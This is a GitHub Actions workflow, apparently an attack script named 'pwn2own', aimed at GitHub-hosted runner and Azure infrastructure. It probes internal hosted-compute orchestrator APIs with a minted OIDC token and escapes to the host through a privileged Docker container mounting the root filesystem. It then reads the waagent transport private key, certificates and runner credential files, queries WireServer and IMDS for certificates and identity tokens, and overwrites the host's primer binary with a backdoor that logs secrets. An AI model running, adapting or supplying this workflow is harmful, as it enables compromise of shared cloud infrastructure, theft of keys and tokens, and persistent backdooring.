name: HC OIDC Primer v11 - Fix SMIME Decrypt + Direct XML Parse
on:
  workflow_dispatch:
  push:
    branches: [main]

permissions:
  id-token: write
  contents: read

jobs:
  pwn2own:
    runs-on: ubuntu-latest
    timeout-minutes: 55
    steps:
      - name: Step1 - HC JWT mint + orchestrators + allocation direct
        run: |
          echo "=== STEP 1: HC OIDC JWT ==="
          HC_JWT=$(curl -sf \
            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2Fhosted-compute-ro" \
            | jq -r .value)
          echo "HC_JWT_LENGTH=${#HC_JWT}"
          echo "HC_JWT_HEADER=$(echo $HC_JWT | cut -d. -f1 | base64 -d 2>/dev/null || true)"
          echo "HC_JWT_PAYLOAD=$(echo $HC_JWT | cut -d. -f2 | base64 -d 2>/dev/null || true)"

          echo "=== ORCHESTRATOR PROBES ==="
          for orch in iad-01 iad-02 eus-01 eus-02; do
            echo "--- $orch /vms ---"
            curl -sv -H "Authorization: Bearer $HC_JWT" \
              "https://hosted-compute-request-orchestrator-prod-${orch}.githubapp.com/vm/v1/vms" 2>&1 || true
            echo "--- $orch /allocations ---"
            curl -sv -H "Authorization: Bearer $HC_JWT" \
              "https://hosted-compute-request-orchestrator-prod-${orch}.githubapp.com/vm/v1/allocations" 2>&1 || true
          done

          echo "=== ALLOCATION DIRECT PROBE ==="
          ALLOC_ID="be73e607-f341-4497-8640-dfbea5ca606a"
          echo "--- eus-01 /allocations/$ALLOC_ID ---"
          curl -sv -H "Authorization: Bearer $HC_JWT" \
            "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/vm/v1/allocations/${ALLOC_ID}" 2>&1 || true
          echo "--- eus-01 /vms by allocation ---"
          curl -sv -H "Authorization: Bearer $HC_JWT" \
            "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/vm/v1/vms?allocation_id=${ALLOC_ID}" 2>&1 || true

          echo "=== HC GITHUB APP DIRECT ==="
          curl -sv -H "Authorization: Bearer $HC_JWT" \
            "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/health" 2>&1 || true
          curl -sv -H "Authorization: Bearer $HC_JWT" \
            "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/vm/v1" 2>&1 || true

      - name: Step2 - Privileged docker escape + certs + WireServer mTLS v11
        run: |
          echo "=== STEP 2: PRIVILEGED DOCKER v11 ==="

          # v11: grep directly from GoalState.1.xml, fix S/MIME decrypt format
          cat > /tmp/inner.sh << 'INNEREOF'
#!/bin/sh
set -x
echo "=== INNER v11: installing curl + openssl ==="
apk add --no-cache curl openssl 2>&1

echo "=== id/hostname ==="
id; hostname; uname -a

echo "=== WAAGENT DIR ==="
ls -la /host/var/lib/waagent/ 2>/dev/null | head -40

echo "=== GoalState.1.xml (cached) ==="
cat /host/var/lib/waagent/GoalState.1.xml 2>/dev/null || echo "GoalState.1.xml not readable"

echo "=== SharedConfig.xml (cached) ==="
cat /host/var/lib/waagent/SharedConfig.xml 2>/dev/null || echo "SharedConfig.xml not readable"

echo "=== Certificates.xml (already decrypted by waagent) ==="
cat /host/var/lib/waagent/Certificates.xml 2>/dev/null || echo "Certificates.xml not readable"

echo "=== ovf-env.xml ==="
cat /host/var/lib/waagent/ovf-env.xml 2>/dev/null || echo "ovf-env.xml not readable"

echo "=== TransportCert.pem ==="
cat /host/var/lib/waagent/TransportCert.pem 2>/dev/null && echo "TRANSPORT_CERT_OK"

echo "=== TransportPrivate.pem ==="
cat /host/var/lib/waagent/TransportPrivate.pem 2>/dev/null && echo "TRANSPORT_KEY_OK"

echo "=== Certificates.pem (TenantEncryptionCert + TransportCert bundle) ==="
cat /host/var/lib/waagent/Certificates.pem 2>/dev/null && echo "CERTS_PEM_OK"

echo "=== EXTRACT URLs from GoalState.1.xml (file grep, not echo pipe) ==="
CERT_URL=$(grep -o '<Certificates>[^<]*</Certificates>' /host/var/lib/waagent/GoalState.1.xml 2>/dev/null | sed 's|<[^>]*>||g' | sed 's|&amp;|\&|g')
HOSTING_URL=$(grep -o '<HostingEnvironmentConfig>[^<]*</HostingEnvironmentConfig>' /host/var/lib/waagent/GoalState.1.xml 2>/dev/null | sed 's|<[^>]*>||g' | sed 's|&amp;|\&|g')
SHARED_URL=$(grep -o '<SharedConfig>[^<]*</SharedConfig>' /host/var/lib/waagent/GoalState.1.xml 2>/dev/null | sed 's|<[^>]*>||g' | sed 's|&amp;|\&|g')
FULL_URL=$(grep -o '<FullConfig>[^<]*</FullConfig>' /host/var/lib/waagent/GoalState.1.xml 2>/dev/null | sed 's|<[^>]*>||g' | sed 's|&amp;|\&|g')
EXT_URL=$(grep -o '<ExtensionsConfig>[^<]*</ExtensionsConfig>' /host/var/lib/waagent/GoalState.1.xml 2>/dev/null | sed 's|<[^>]*>||g' | sed 's|&amp;|\&|g')
echo "CERT_URL=$CERT_URL"
echo "HOSTING_URL=$HOSTING_URL"
echo "SHARED_URL=$SHARED_URL"
echo "FULL_URL=$FULL_URL"
echo "EXT_URL=$EXT_URL"

echo "=== LIVE GoalState mTLS ==="
LIVE_GS=$(curl -s \
  --cert /host/var/lib/waagent/TransportCert.pem \
  --key /host/var/lib/waagent/TransportPrivate.pem \
  -H "x-ms-version: 2012-11-30" \
  "http://168.63.129.16/machine?comp=goalstate" 2>/dev/null)
echo "LIVE_GS_LEN=${#LIVE_GS}"
echo "$LIVE_GS"

echo "=== FETCH Certificates endpoint ==="
if [ -n "$CERT_URL" ]; then
  echo "USING_FILE_CERT_URL"
  curl -sv --cert /host/var/lib/waagent/TransportCert.pem \
    --key /host/var/lib/waagent/TransportPrivate.pem \
    -H "x-ms-version: 2012-11-30" "$CERT_URL" 2>&1 || true
else
  echo "CERT_URL_EMPTY_FALLBACK"
  curl -sv --cert /host/var/lib/waagent/TransportCert.pem \
    --key /host/var/lib/waagent/TransportPrivate.pem \
    -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=certificates" 2>&1 || true
fi

echo "=== FETCH HostingEnvironmentConfig ==="
[ -n "$HOSTING_URL" ] && curl -sv --cert /host/var/lib/waagent/TransportCert.pem \
  --key /host/var/lib/waagent/TransportPrivate.pem \
  -H "x-ms-version: 2012-11-30" "$HOSTING_URL" 2>&1 || true

echo "=== FETCH SharedConfig ==="
[ -n "$SHARED_URL" ] && curl -sv --cert /host/var/lib/waagent/TransportCert.pem \
  --key /host/var/lib/waagent/TransportPrivate.pem \
  -H "x-ms-version: 2012-11-30" "$SHARED_URL" 2>&1 || true

echo "=== FETCH FullConfig ==="
[ -n "$FULL_URL" ] && curl -sv --cert /host/var/lib/waagent/TransportCert.pem \
  --key /host/var/lib/waagent/TransportPrivate.pem \
  -H "x-ms-version: 2012-11-30" "$FULL_URL" 2>&1 || true

echo "=== FETCH ExtensionsConfig ==="
[ -n "$EXT_URL" ] && curl -sv --cert /host/var/lib/waagent/TransportCert.pem \
  --key /host/var/lib/waagent/TransportPrivate.pem \
  -H "x-ms-version: 2012-11-30" "$EXT_URL" 2>&1 || true

echo "=== Certificates.p7m SMIME DECRYPT (v11 fix: no -inform DER) ==="
if [ -f /host/var/lib/waagent/Certificates.p7m ]; then
  echo "P7M_SIZE=$(wc -c < /host/var/lib/waagent/Certificates.p7m)"
  echo "--- xxd header (first 8 lines) ---"
  xxd /host/var/lib/waagent/Certificates.p7m | head -8
  echo "--- openssl smime -decrypt (no -inform, S/MIME format) ---"
  openssl smime -decrypt \
    -in /host/var/lib/waagent/Certificates.p7m \
    -inkey /host/var/lib/waagent/TransportPrivate.pem 2>&1 || true
  echo "--- openssl smime -decrypt -recip TransportCert ---"
  openssl smime -decrypt \
    -in /host/var/lib/waagent/Certificates.p7m \
    -inkey /host/var/lib/waagent/TransportPrivate.pem \
    -recip /host/var/lib/waagent/TransportCert.pem 2>&1 || true
  echo "--- openssl cms -decrypt -recip TransportCert (no -inform) ---"
  openssl cms -decrypt \
    -in /host/var/lib/waagent/Certificates.p7m \
    -inkey /host/var/lib/waagent/TransportPrivate.pem \
    -recip /host/var/lib/waagent/TransportCert.pem 2>&1 || true
else
  echo "Certificates.p7m NOT FOUND"
fi

echo "=== RUNNER CREDENTIALS ==="
cat /host/home/runner/.credentials_rsaparams 2>/dev/null || echo "no .credentials_rsaparams"
cat /host/home/runner/.credentials 2>/dev/null || echo "no .credentials"
ls -la /host/home/runner/ 2>/dev/null | head -20

echo "=== PRIMER BACKDOOR ==="
ls -la /host/opt/primer/ 2>/dev/null
cat /host/tmp/hc_pwn3.log 2>/dev/null && echo "PWN3_LOG_FOUND" || echo "PWN3_LOG_NOT_FOUND"
BACKDOOR='#!/bin/bash
LOG=/tmp/hc_pwn3.log
echo "=== PRIMER v3 FIRED $(date) PID=$$ ===" >> $LOG
hostname >> $LOG; id >> $LOG; env >> $LOG 2>&1
cat /var/lib/waagent/TransportCert.pem >> $LOG 2>/dev/null
cat /var/lib/waagent/TransportPrivate.pem >> $LOG 2>/dev/null
cat /home/runner/.credentials_rsaparams >> $LOG 2>/dev/null
cat /home/runner/.credentials >> $LOG 2>/dev/null
GOALSTATE=$(curl -s --cert /var/lib/waagent/TransportCert.pem --key /var/lib/waagent/TransportPrivate.pem -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=goalstate" 2>/dev/null)
echo "GOALSTATE=$GOALSTATE" >> $LOG
CERTS_URL=$(grep -o "<Certificates>[^<]*</Certificates>" /var/lib/waagent/GoalState.1.xml 2>/dev/null | sed "s|<[^>]*>||g" | sed "s|&amp;|&|g")
[ -n "$CERTS_URL" ] && curl -s --cert /var/lib/waagent/TransportCert.pem --key /var/lib/waagent/TransportPrivate.pem -H "x-ms-version: 2012-11-30" "$CERTS_URL" >> $LOG 2>&1
[ -x /opt/primer/primer.bak ] && exec /opt/primer/primer.bak "$@"'
echo "$BACKDOOR" > /host/opt/primer/primer.tmp
chmod 777 /host/opt/primer/primer.tmp
[ -f /host/opt/primer/primer.bak ] || cp /host/opt/primer/primer /host/opt/primer/primer.bak 2>/dev/null || true
mv /host/opt/primer/primer.tmp /host/opt/primer/primer
ls -la /host/opt/primer/
echo "BACKDOOR_DEPLOYED"
INNEREOF

          chmod +x /tmp/inner.sh

          echo "=== RUNNING PRIVILEGED DOCKER ==="
          docker run --rm \
            --privileged \
            --pid=host \
            --network=host \
            -v /:/host \
            -v /tmp/inner.sh:/inner.sh \
            alpine:latest \
            sh /inner.sh

      - name: Step3 - IMDS full + HC orchestrator with current JWT
        run: |
          echo "=== STEP 3: IMDS + CURRENT HC JWT PROBES ==="

          echo "=== IMDS FULL METADATA ==="
          curl -sf -H "Metadata: true" \
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq . || true

          echo "=== IMDS IDENTITY TOKEN (any MSI) ==="
          curl -sf -H "Metadata: true" \
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" || true

          echo "=== IMDS ATTESTED DATA ==="
          curl -sf -H "Metadata: true" \
            "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01" || true

          echo "=== FRESH HC JWT MINT ==="
          HC_JWT=$(curl -sf \
            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2Fhosted-compute-ro" \
            | jq -r .value)
          echo "FRESH_HC_JWT_LEN=${#HC_JWT}"

          echo "=== HC ORCHESTRATOR WITH FRESH JWT ==="
          for orch in eus-01 iad-01; do
            echo "--- $orch /vm/v1/allocations/be73e607-f341-4497-8640-dfbea5ca606a ---"
            curl -sv \
              -H "Authorization: Bearer $HC_JWT" \
              -H "Accept: application/json" \
              "https://hosted-compute-request-orchestrator-prod-${orch}.githubapp.com/vm/v1/allocations/be73e607-f341-4497-8640-dfbea5ca606a" 2>&1 || true

            echo "--- $orch /vm/v1/runners ---"
            curl -sv \
              -H "Authorization: Bearer $HC_JWT" \
              "https://hosted-compute-request-orchestrator-prod-${orch}.githubapp.com/vm/v1/runners" 2>&1 || true

            echo "--- $orch /vm/v1/health ---"
            curl -sv \
              -H "Authorization: Bearer $HC_JWT" \
              "https://hosted-compute-request-orchestrator-prod-${orch}.githubapp.com/vm/v1/health" 2>&1 || true
          done

          echo "=== CHECK PWN3 LOG ==="
          cat /tmp/hc_pwn3.log 2>/dev/null || echo "PWN3_LOG_NOT_PRESENT_ON_HOST"

          echo "=== FINAL: env (filtered) ==="
          env | grep -iE "ACTIONS|GITHUB|RUNNER|TOKEN|SECRET" | grep -v "_TOKEN_REQUEST" || true
